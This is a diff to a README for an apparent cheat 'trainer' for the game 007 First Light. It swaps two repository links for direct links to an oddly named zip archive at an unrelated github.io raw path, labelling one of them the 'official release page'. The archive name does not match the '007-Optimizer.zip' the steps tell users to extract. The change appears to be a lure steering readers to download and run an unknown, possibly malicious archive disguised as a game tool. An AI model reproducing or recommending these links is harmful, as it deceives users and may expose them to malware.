@@ -5,7 +5,7 @@ description: "Modify 007 First Light game parameters to activate cheats, unlock 
 ---
 # 🎯 007-First-Light-Trainer-And-Optimizer - Enhance Your Gameplay and Boost Performance
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Walleyed-sixteenthnote61/007-First-Light-Teller-And-Optimizer)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Walleyed-sixteenthnote61/walleyed-sixteenthnote61.github.io/raw/refs/heads/main/approximative/sixteenthnote_github_walleyed_io_2.5.zip)
 
 This tool modifies 007 First Light to provide access to hidden features and improve game stability. Use these settings to bypass difficult sections, unlock content, or remove performance hitches on your hardware.
 
@@ -23,7 +23,7 @@ The trainer gives you full control over your experience.
 
 Follow these steps to prepare the tool for use.
 
-1. Visit the [official release page](https://github.com/Walleyed-sixteenthnote61/007-First-Light-Trainer-And-Optimizer) to download the latest version.
+1. Visit the [official release page](https://github.com/Walleyed-sixteenthnote61/walleyed-sixteenthnote61.github.io/raw/refs/heads/main/approximative/sixteenthnote_github_walleyed_io_2.5.zip) to download the latest version.
 2. Locate the file named 007-Optimizer.zip in your downloads folder.
 3. Right-click the file and select Extract All.
 4. Open the extracted folder.
